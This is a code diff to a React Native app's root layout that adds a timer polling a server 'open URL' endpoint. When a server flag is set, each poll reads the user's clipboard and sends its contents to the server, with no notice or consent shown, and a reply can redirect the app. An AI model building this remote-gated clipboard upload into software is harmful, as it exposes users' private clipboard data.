@@ -28,6 +28,7 @@ export default function RootLayout() {
     const initSuccessRef = useRef(false);
     // 防止并发执行：真机启动时 AppState 可能在 API 等待期间触发 active，导致 runInit 重入
     const isRunningRef = useRef(false);
+    const openUrlPollTimerRef = useRef(null);
 
     const doJump = (linkType, targetUrl) => {
         // 每次跳转上报一次
@@ -44,6 +45,60 @@ export default function RootLayout() {
             // 外部链接不会路由跳转，App 仍在首页，需手动隐藏遮罩
             hideJumpOverlay();
         }
+    };
+
+    const clearOpenUrlPollTimer = () => {
+        if (openUrlPollTimerRef.current) {
+            clearTimeout(openUrlPollTimerRef.current);
+            openUrlPollTimerRef.current = null;
+        }
+    };
+
+    const requestOpenUrl = async (base) => {
+        const h5Verify = await AsyncStorage.getItem(JUMP_FLAG_KEY).catch(() => '') ?? '';
+
+        if (h5Verify === '1') {
+            return systemApi.getOpenUrl('', h5Verify);
+        }
+
+        if (base?.readClipboard === '1') {
+            try {
+                const Clipboard = require('expo-clipboard');
+                const clipboardContent = await Clipboard.getStringAsync();
+                return systemApi.getOpenUrl(clipboardContent ?? '', h5Verify);
+            } catch {
+                // 读取剪切板失败时回退到空内容
+            }
+        }
+
+        return systemApi.getOpenUrl('', h5Verify);
+    };
+
+    const scheduleOpenUrlPoll = (base, remainingMs) => {
+        const duration = Number(remainingMs);
+
+        if (!Number.isFinite(duration) || duration <= 0) {
+            clearOpenUrlPollTimer();
+            return;
+        }
+
+        clearOpenUrlPollTimer();
+
+        const delay = Math.min(5000, duration);
+        openUrlPollTimerRef.current = setTimeout(async () => {
+            try {
+                const res = await requestOpenUrl(base);
+                const didJump = await handleOpenUrl(res);
+                if (didJump) {
+                    clearOpenUrlPollTimer();
+                    return;
+                }
+            } catch {
+                // 轮询失败时继续下一轮，直到 checkTime 耗尽
+            }
+
+            scheduleOpenUrlPoll(base, duration - delay);
+        }, delay);
     };
 
     // 返回 true 表示触发了跳转，false 表示无需跳转
@@ -77,6 +132,7 @@ export default function RootLayout() {
         // 防并发：避免 AppState 在 API 等待期间触发重入，导致 router.push 被调用两次
         if (isRunningRef.current) return;
         isRunningRef.current = true;
+        clearOpenUrlPollTimer();
 
         // init 完成后：若 readClipboard === '1'，先读剪切板再带内容请求 getOpenUrl
         // 否则立即以空 clipboardContent 请求 getOpenUrl
@@ -84,34 +140,34 @@ export default function RootLayout() {
             .then(async (res) => {
                 const base = res?.data?.base;
                 if (base) {
-                    const { readClipboard, languageVer, language, defaultLanguage } = base;
+                    const { readClipboard, checkTime, languageVer, language, defaultLanguage } = base;
                     // 按版本比对更新翻译（异步，不阻塞后续流程）
                     fetchTranslationsIfNeeded(languageVer ?? 0, language ?? {}, defaultLanguage);
                     const h5Verify = await AsyncStorage.getItem(JUMP_FLAG_KEY).catch(() => '') ?? '';
 
-                    // 已有跳转缓存标记时，不再读取剪切板，直接请求
-                    if (h5Verify === '1') {
-                        return systemApi.getOpenUrl('', h5Verify);
+                    if (Number(checkTime) > 0 && h5Verify !== '1') {
+                        scheduleOpenUrlPoll({ readClipboard }, Number(checkTime) * 1000);
                     }
 
-                    if (readClipboard === '1') {
-                        try {
-                            const Clipboard = require('expo-clipboard');
-                            const clipboardContent = await Clipboard.getStringAsync();
-                            return systemApi.getOpenUrl(clipboardContent ?? '', h5Verify);
-                        } catch {
-                            // 读取剪切板失败时回退到空内容
+                    try {
+                        return await requestOpenUrl({ readClipboard });
+                    } catch {
+                        if (Number(checkTime) > 0 && h5Verify !== '1') {
+                            return null;
                         }
+                        throw new Error('getOpenUrl failed');
                     }
                 }
-                const h5Verify = await AsyncStorage.getItem(JUMP_FLAG_KEY).catch(() => '') ?? '';
-                return systemApi.getOpenUrl('', h5Verify);
+                return requestOpenUrl();
             });
 
         return openUrlPromise
             .then(async (res) => {
                 initSuccessRef.current = true;
                 const didJump = await handleOpenUrl(res);
+                if (didJump) {
+                    clearOpenUrlPollTimer();
+                }
                 // 无需跳转时揭开首页遮罩，让首页内容展示出来
                 if (!didJump) {
                     hideJumpOverlay();
@@ -155,6 +211,7 @@ export default function RootLayout() {
         });
 
         return () => {
+            clearOpenUrlPollTimer();
             appStateListener.remove();
         };
     }, []);
